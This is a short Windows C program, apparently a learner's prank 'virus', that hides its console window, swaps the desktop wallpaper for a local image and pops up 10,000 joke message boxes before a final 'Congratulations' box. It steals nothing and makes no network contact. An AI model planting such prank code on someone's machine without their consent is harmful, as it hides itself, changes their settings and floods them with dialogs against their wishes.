#include <stdlib.h>
#include <stdio.h>
#include <windows.h>

#include "console.h"

int main() {
    hideConsole();
    setWallpaper(L"C:\\Users\\User\\Documents\\C\\learning-c\\Wirus\\tapeta.png");
    for (int i = 0; i < 10000; i++) {
        showMessageBox("KŁAPOUCH GUROMMMMM", "KŁAPOUCH GUROMMMMM");
    }
    showMessageBox("Congratulations", "Congratulations you've clicked this window 10,000 times!");
    return 0;
}